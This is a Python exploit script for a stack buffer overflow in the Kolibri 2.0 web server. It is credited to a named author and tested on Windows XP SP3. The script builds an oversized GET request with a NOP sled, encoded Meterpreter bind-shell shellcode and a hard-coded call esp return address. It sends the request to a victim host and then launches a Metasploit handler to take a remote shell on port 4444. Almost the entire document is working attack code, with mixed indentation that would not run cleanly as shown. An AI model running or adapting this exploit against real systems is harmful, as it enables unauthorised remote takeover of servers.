#!/usr/bin/python 
# Exploit Title: Kolibri GET request Stack buffer Overflow 
# Date: 25 April 2014
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Vendor Homepage: http://www.senkas.com/kolibri/download.php
# Version: Kolibri 2.0 
# Tested on: Windows XP SP3,  Spanish
# Thanks:To my wife for putting up with my possessions
# Description: 
# A buffer overflow is triggered when a long GET command is sent to the server.

import socket, sys, os, time 

if len(sys.argv) != 3:
	print "[*] Uso: %s <Ip Victima> <Puerto> \n" % sys.argv[0]
        print "[*] Exploit created by Polunchis"
        print "[*] https://www.intrusionlabs.com.mx"
	sys.exit(0)
host = sys.argv[1]         
port = int(sys.argv[2])
 
#./msfpayload windows/meterpreter/bind_tcp R | ./msfencode -t c -b '\x00\xff\x0a\x0d\x20\x40'
shellcode = (
"\x29\xc9\x83\xe9\xb5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xaa\x86\x33\x5f\x83\xee\xfc\xe2\xf4\x56\x6e\xba\x5f\xaa\x86"
"\x53\xd6\x4f\xb7\xe1\x3b\x21\xd4\x03\xd4\xf8\x8a\xb8\x0d\xbe"
"\x0d\x41\x77\xa5\x31\x79\x79\x9b\x79\x02\x9f\x06\xba\x52\x23"
"\xa8\xaa\x13\x9e\x65\x8b\x32\x98\x48\x76\x61\x08\x21\xd4\x23"
"\xd4\xe8\xba\x32\x8f\x21\xc6\x4b\xda\x6a\xf2\x79\x5e\x7a\xd6"
"\xb8\x17\xb2\x0d\x6b\x7f\xab\x55\xd0\x63\xe3\x0d\x07\xd4\xab"
"\x50\x02\xa0\x9b\x46\x9f\x9e\x65\x8b\x32\x98\x92\x66\x46\xab"
"\xa9\xfb\xcb\x64\xd7\xa2\x46\xbd\xf2\x0d\x6b\x7b\xab\x55\x55"
"\xd4\xa6\xcd\xb8\x07\xb6\x87\xe0\xd4\xae\x0d\x32\x8f\x23\xc2"
"\x17\x7b\xf1\xdd\x52\x06\xf0\xd7\xcc\xbf\xf2\xd9\x69\xd4\xb8"
"\x6d\xb5\x02\xc2\xb5\x01\x5f\xaa\xee\x44\x2c\x98\xd9\x67\x37"
"\xe6\xf1\x15\x58\x55\x53\x8b\xcf\xab\x86\x33\x76\x6e\xd2\x63"
"\x37\x83\x06\x58\x5f\x55\x53\x63\x0f\xfa\xd6\x73\x0f\xea\xd6"
"\x5b\xb5\xa5\x59\xd3\xa0\x7f\x11\x02\x84\xf9\xee\x31\x5f\xbb"
"\xda\xba\xb9\xc0\x96\x65\x08\xc2\x44\xe8\x68\xcd\x79\xe6\x0c"
"\xfd\xee\x84\xb6\x92\x79\xcc\x8a\xf9\xd5\x64\x37\xde\x6a\x08"
"\xbe\x55\x53\x64\xc8\xc2\xf3\x5d\x12\xcb\x79\xe6\x35\xaa\xec"
"\x37\x09\xfd\xee\x31\x86\x62\xd9\xcc\x8a\x21\xb0\x59\x1f\xc2"
"\x86\x23\x5f\xaa\xd0\x59\x5f\xc2\xde\x97\x0c\x4f\x79\xe6\xcc"
"\xf9\xec\x33\x09\xf9\xd1\x5b\x5d\x73\x4e\x6c\xa0\x7f\x87\xf0"
"\x76\x6c\x03\xc5\x2a\x46\x45\x33\x5f"
)

nop =  "A" * 33 + '\x90' * 20
junk = "C" *(515-(len(nop)+len(shellcode)))
opcode= "\x83\xc4\x44\x83\xc4\x44\x83\xc4\x44\xff\xe4"
eip = '\x63\x46\x92\x7c'
#7c86467b 7C924663 call esp
buffer = nop + shellcode + junk + eip + opcode + "B" * 60 

req = ("GET /" + buffer + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
"Connection: keep-alive\r\n\r\n")
print "  [+] Connecting to %s:%d" % (host, port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((host, port))
	print "  [+] Sending payload.." + "nop: " + str(len(nop)) + "   junk: " + str(len(junk)) + "   shellcode: " + str(len(shellcode))
	s.send(req)
	data = s.recv(1024)
	print "  [+] Closing connection.."
	s.close()
	print "[+] Exploit Sent Successfully"
    	print "[+] Waiting for 3 sec before spawning shell to " + host + ":4444\r"
    	print "\r"
    	time.sleep(3)
        os.system("msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/bind_tcp RHOST=192.168.0.106 LPORT=4444 E")
    	print "[-] Connection lost from " + host + ":4444 \r"
except:
    	print "[-] Could not connect to " + host + ":4444\r"
        sys.exit(0) 